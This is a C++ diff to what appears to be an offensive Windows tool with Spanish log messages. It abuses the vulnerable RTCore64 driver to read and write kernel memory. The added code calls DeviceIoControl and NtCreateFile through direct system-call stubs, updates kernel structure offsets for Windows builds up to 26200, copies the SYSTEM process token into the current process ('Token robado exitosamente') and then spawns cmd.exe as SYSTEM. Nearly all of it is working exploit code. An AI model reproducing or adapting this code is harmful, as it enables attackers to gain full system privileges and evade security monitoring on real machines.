@@ -221,7 +221,7 @@ BYTE nPsInitialSysProc[] =
 
 // ===================================== Global Structs
 
-funStruct sDeviceIoControl;
+funStruct sDeviceIoControl = { 0 };
 
 // =====================================
 
@@ -230,99 +230,6 @@ static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
 static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;
 
 // =====================================
-
-DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
-    RTCORE64_MEMORY_READ MemoryRead{};
-    MemoryRead.Address = Address;
-    MemoryRead.ReadSize = Size;
-
-    DWORD BytesReturned;
-
-    DeviceIoControl(Device,
-        RTCORE64_MEMORY_READ_CODE,
-        &MemoryRead,
-        sizeof(MemoryRead),
-        &MemoryRead,
-        sizeof(MemoryRead),
-        &BytesReturned,
-        nullptr);
-
-    return MemoryRead.Value;
-}
-
-void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
-    RTCORE64_MEMORY_READ MemoryRead{};
-    MemoryRead.Address = Address;
-    MemoryRead.ReadSize = Size;
-    MemoryRead.Value = Value;
-
-    DWORD BytesReturned;
-
-    DeviceIoControl(Device,
-        RTCORE64_MEMORY_WRITE_CODE,
-        &MemoryRead,
-        sizeof(MemoryRead),
-        &MemoryRead,
-        sizeof(MemoryRead),
-        &BytesReturned,
-        nullptr);
-}
-
-WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
-    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
-}
-
-DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
-    return ReadMemoryPrimitive(Device, 4, Address);
-}
-
-DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
-    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
-}
-
-void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
-    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
-    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
-}
-
-// =====================================
-
-VOID SetUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
-    if (SourceString == nullptr) {
-        DestinationString->Length = 0;
-        DestinationString->MaximumLength = 0;
-        DestinationString->Buffer = nullptr;
-    }
-    else {
-        size_t size = wcslen(SourceString) * sizeof(WCHAR);
-        DestinationString->Length = static_cast<USHORT>(size);
-        DestinationString->MaximumLength = static_cast<USHORT>(size + sizeof(WCHAR));
-        DestinationString->Buffer = const_cast<PWSTR>(SourceString);
-    }
-}
-
-BOOL CheckDrvrLoad()
-{
-    BOOL ret = TRUE;
-
-    HANDLE hDevice = CreateFileW(
-        L"\\\\.\\RTCore64",
-        GENERIC_READ | GENERIC_WRITE,
-        0,
-        NULL,
-        OPEN_EXISTING,
-        0,
-        NULL
-    );
-    if (hDevice != INVALID_HANDLE_VALUE) {
-        CloseHandle(hDevice);
-    }
-    else {
-        ret = FALSE;
-    }
-
-    return ret;
-}
 
 // =====================================
 VOID getWord(char* dst, PBYTE clave, SIZE_T size)
@@ -447,6 +354,150 @@ BOOL get_numSys(pfunStruct structFunction)
 
     return TRUE;
 }
+
+// ========================================
+
+DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
+    RTCORE64_MEMORY_READ MemoryRead{};
+    MemoryRead.Address = Address;
+    MemoryRead.ReadSize = Size;
+
+    // Get Stub
+    if (sDeviceIoControl.sysnum == 0)
+    {
+        sDeviceIoControl.name = nDeviceIoControl;
+        sDeviceIoControl.size = sizeof(nDeviceIoControl);
+
+        if (!get_numSys(&sDeviceIoControl)) {
+            return 0;
+        }
+    }
+
+    IO_STATUS_BLOCK ioStatus = { 0 };
+
+    SetCall(sDeviceIoControl.sysnum);
+
+    NTSTATUS status = CallFunc(
+        Device,                              
+        NULL,                                
+        NULL,                                
+        NULL,                               
+        &ioStatus,                           
+        RTCORE64_MEMORY_READ_CODE,           
+        &MemoryRead,                         
+        sizeof(MemoryRead),                 
+        &MemoryRead,                         
+        sizeof(MemoryRead)                   
+    );
+
+    if (status)
+    {
+        LOG_ERROR("Error al leer memoria: 0x%8x", status);
+        return 0;
+    }
+
+    return MemoryRead.Value;
+}
+
+void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
+    RTCORE64_MEMORY_READ MemoryRead{};
+    MemoryRead.Address = Address;
+    MemoryRead.ReadSize = Size;
+    MemoryRead.Value = Value;
+
+    DWORD BytesReturned;
+
+    // Get stub
+    if (sDeviceIoControl.sysnum == 0)
+    {
+        sDeviceIoControl.name = nDeviceIoControl;
+        sDeviceIoControl.size = sizeof(nDeviceIoControl);
+
+        if (!get_numSys(&sDeviceIoControl)) {
+            return;
+        }
+    }
+
+    IO_STATUS_BLOCK ioStatus = { 0 };
+
+    SetCall(sDeviceIoControl.sysnum);
+
+    NTSTATUS status = CallFunc(
+        Device,
+        NULL,
+        NULL,
+        NULL,
+        &ioStatus,
+        RTCORE64_MEMORY_WRITE_CODE,
+        &MemoryRead,
+        sizeof(MemoryRead),
+        &MemoryRead,
+        sizeof(MemoryRead)
+    );
+
+    if (status)
+    {
+        LOG_ERROR("Error escribiendo la memoria: 0x%8x", status);
+    }
+}
+
+WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
+    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
+}
+
+DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
+    return ReadMemoryPrimitive(Device, 4, Address);
+}
+
+DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
+    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
+}
+
+VOID WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
+    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
+    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
+}
+
+// =====================================
+
+VOID SetUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
+    if (SourceString == nullptr) {
+        DestinationString->Length = 0;
+        DestinationString->MaximumLength = 0;
+        DestinationString->Buffer = nullptr;
+    }
+    else {
+        size_t size = wcslen(SourceString) * sizeof(WCHAR);
+        DestinationString->Length = static_cast<USHORT>(size);
+        DestinationString->MaximumLength = static_cast<USHORT>(size + sizeof(WCHAR));
+        DestinationString->Buffer = const_cast<PWSTR>(SourceString);
+    }
+}
+
+BOOL CheckDrvrLoad()
+{
+    BOOL ret = TRUE;
+
+    HANDLE hDevice = CreateFileW(
+        L"\\\\.\\RTCore64",
+        GENERIC_READ | GENERIC_WRITE,
+        0,
+        NULL,
+        OPEN_EXISTING,
+        0,
+        NULL
+    );
+    if (hDevice != INVALID_HANDLE_VALUE) {
+        CloseHandle(hDevice);
+    }
+    else {
+        ret = FALSE;
+    }
+
+    return ret;
+}
+
+// ======================================
 
 // Conseguir ubicacion
 BOOL getPath(WCHAR* completePath)
@@ -903,7 +954,7 @@ struct Offsets getOffs()
     }
 
     UNICODE_STRING valueName;
-    SetUnicodeString(&valueName, L"ReleaseId");
+    SetUnicodeString(&valueName, L"CurrentBuildNumber");
 
     const ULONG initialBufferSize = 1024;
     auto buffer = std::make_unique<BYTE[]>(initialBufferSize);
@@ -919,30 +970,46 @@ struct Offsets getOffs()
         return Offsets{ 0,0,0 };
     }
 
-    LOG_OK("Se leyo buffer de ReleaseId");
-
     auto info = reinterpret_cast<PKEY_VALUE_PARTIAL_INFORMATION>(buffer.get());
 
     auto strData = reinterpret_cast<PWSTR>(info->Data);
 
-    LOG_OK("Version de releaseId: %ls", strData);
+    LOG_OK("Numero de build: %ls", strData);
 
     CloseHandle(hKey);
 
     auto wV = _wtoi(strData);
 
+
     switch (wV) {
-    case 1607:
-        return Offsets{ 0x02e8, 0x02f0, 0x0358 };
-    case 1803:
-    case 1809:
-        return Offsets{ 0x02e0, 0x02e8, 0x0358 };
-    case 1903:
-    case 1909:
+    case 26200:
+    case 26100:
+        return Offsets{ 0x1d0, 0x1d8, 0x248 };
+
+    case 22631:
+    case 22621:
+    case 20348:
+    case 22000:
+    case 19045:
+    case 19044:
+    case 19043:
+    case 19042:
+    case 19041:
+        return Offsets{ 0x440, 0x448, 0x4b8 };
+
+    case 18362:
         return Offsets{ 0x02e8, 0x02f0, 0x0360 };
-    case 2004:
-    case 2009:
-        return Offsets{ 0x0440, 0x0448, 0x04b8 };
+
+    case 17763:
+    case 17134:
+    case 16299:
+    case 15063:
+        return Offsets{ 0x2e0, 0x2e8, 0x358 };
+
+    case 14393:
+    case 10586:
+    case 10240:
+        return Offsets{ 0x2e0, 0x2e8, 0x358 };
 
     default:
         LOG_ERROR("Esa version no esta definida");
@@ -1037,46 +1104,154 @@ DWORD64 GetPsSysAddress() {
 }
 
 // Spawn de CMD
-BOOL GetCMD()
+BOOL GetTkn()
 {
-    if (!CheckDrvrLoad())
-    {
-        LOG_ERROR("El dvr no esta cargado");
+    if (!CheckDrvrLoad()) {
+        LOG_ERROR("El drv no esta cargado");
         return FALSE;
     }
 
     Offsets offs = getOffs();
-
-    if (offs.APLinksOffset == 0 && offs.TOffset == 0 && offs.UPIdOffset == 0)
-    {
-        LOG_ERROR("No se obtuvieron los offsets");
+    if (offs.APLinksOffset == 0 || offs.TOffset == 0 || offs.UPIdOffset == 0) {
+        LOG_ERROR("Offsets invalidos");
         return FALSE;
     }
 
     PVOID knlBase = ntosKnlBase();
-
-    if (!knlBase)
-    {
-        LOG_ERROR("No se obtuvo la direccion");
+    if (!knlBase) {
+        LOG_ERROR("No se obtuvo la base del kernel");
         return FALSE;
     }
 
     DWORD64 addressPsInitialSys = GetPsSysAddress();
-
-    if (!addressPsInitialSys)
-    {
-        LOG_ERROR("No se obtuvo direccion de PsInitialSystemInfo");
+    if (!addressPsInitialSys) {
+        LOG_ERROR("No se obtuvo PsInitialSystemProcess");
         return FALSE;
     }
 
     LOG_OK("Direccion obtenida 0x%llx", addressPsInitialSys);
 
-    // Abrimos Handle
+    // Abrir el dispositivo
+    HANDLE hDevice = NULL;
+    NTSTATUS status = 0;
+    UNICODE_STRING devicePath;
+    SetUnicodeString(&devicePath, L"\\??\\RTCore64");
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes(&objAttr, &devicePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    IO_STATUS_BLOCK ioStatus = { 0 };
 
+    funStruct sCreateFile;
+    sCreateFile.name = nCreateFile;
+    sCreateFile.size = sizeof(nCreateFile);
+    if (!get_numSys(&sCreateFile)) {
+        LOG_ERROR("No se pudo obtener stub de NtCreateFile");
+        return FALSE;
+    }
 
+    SetCall(sCreateFile.sysnum);
+    status = CallFunc(
+        &hDevice,
+        GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
+        &objAttr,
+        &ioStatus,
+        NULL,
+        FILE_ATTRIBUTE_NORMAL,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        FILE_OPEN,
+        FILE_SYNCHRONOUS_IO_NONALERT,
+        NULL,
+        0
+    );
 
+    if (!NT_SUCCESS(status) || !NT_SUCCESS(ioStatus.Status) || hDevice == INVALID_HANDLE_VALUE) {
+        LOG_ERROR("Error al abrir el dispositivo");
+        if (hDevice) CloseHandle(hDevice);
+        return FALSE;
+    }
+
+    // Leer PsInitialSystemProcess
+    DWORD64 PsInitialSystemProcessAddress = ReadMemoryDWORD64(hDevice, reinterpret_cast<DWORD64>(knlBase) + addressPsInitialSys);
+    if (PsInitialSystemProcessAddress == 0) {
+        LOG_ERROR("No se pudo leer PsInitialSystemProcess");
+        CloseHandle(hDevice);
+        return FALSE;
+    }
+    LOG_INFO("PsInitialSystemProcess: %llx", PsInitialSystemProcessAddress);
+
+    // Leer token de SYSTEM
+    DWORD64 SystemProcessToken = ReadMemoryDWORD64(hDevice, PsInitialSystemProcessAddress + offs.TOffset) & ~15;
+    if (SystemProcessToken == 0) {
+        LOG_ERROR("No se pudo leer el token de SYSTEM");
+        CloseHandle(hDevice);
+        return FALSE;
+    }
+    LOG_INFO("System token: %llx", SystemProcessToken);
+
+    // Buscar el proceso actual
+    DWORD64 CurrentPid = GetCurrentProcessId();
+    DWORD64 ProcessHead = PsInitialSystemProcessAddress + offs.APLinksOffset;
+    DWORD64 CurrentProcessAddress = ProcessHead;
+    DWORD64 UniqueProcessId = 0;
+
+    do {
+        DWORD64 ProcessAddress = CurrentProcessAddress - offs.APLinksOffset;
+        UniqueProcessId = ReadMemoryDWORD64(hDevice, ProcessAddress + offs.UPIdOffset);
+        if (UniqueProcessId == CurrentPid) {
+            CurrentProcessAddress = ProcessAddress;
+            break;
+        }
+        CurrentProcessAddress = ReadMemoryDWORD64(hDevice, ProcessAddress + offs.APLinksOffset);
+    } while (CurrentProcessAddress != ProcessHead);
+
+    if (UniqueProcessId != CurrentPid) {
+        LOG_ERROR("No se encontró el proceso actual");
+        CloseHandle(hDevice);
+        return FALSE;
+    }
+
+    LOG_INFO("Proceso actual encontrado en: %llx", CurrentProcessAddress);
+
+    // Leer el token actual para verificar
+    DWORD64 CurrentToken = ReadMemoryDWORD64(hDevice, CurrentProcessAddress + offs.TOffset) & ~15;
+    if (CurrentToken == 0) {
+        LOG_ERROR("El token actual es 0, no se puede reemplazar");
+        CloseHandle(hDevice);
+        return FALSE;
+    }
+    LOG_INFO("Token actual: %llx", CurrentToken);
+
+    // Realizar el robo de token (escribir)
+    LOG_INFO("Reemplazando token...");
+    WriteMemoryDWORD64(hDevice, CurrentProcessAddress + offs.TOffset, SystemProcessToken);
+
+    // (Opcional) verificar que se escribió correctamente
+    DWORD64 NewToken = ReadMemoryDWORD64(hDevice, CurrentProcessAddress + offs.TOffset) & ~15;
+    if (NewToken != SystemProcessToken) {
+        LOG_ERROR("Falló la escritura del token");
+        CloseHandle(hDevice);
+        return FALSE;
+    }
+
+    LOG_OK("Token robado exitosamente");
+    CloseHandle(hDevice);
     return TRUE;
 }
+
+VOID spawnShll() {
+    STARTUPINFOW StartupInfo{};
+    StartupInfo.cb = sizeof(StartupInfo);
+    PROCESS_INFORMATION ProcessInformation;
+
+    CreateProcessW(LR"(C:\Windows\System32\cmd.exe)",
+        nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr,
+        &StartupInfo,
+        &ProcessInformation);
+
+    WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
+    CloseHandle(ProcessInformation.hThread);
+    CloseHandle(ProcessInformation.hProcess);
+}
+
 
 // Entry Point
 int main()
@@ -1119,9 +1294,12 @@ int main()
 
         // Get CMD
     case 3:
-        if (!GetCMD())
+        if (!GetTkn())
         {
             return -1;
+        }
+        else {
+            spawnShll();
         }
         break;
 
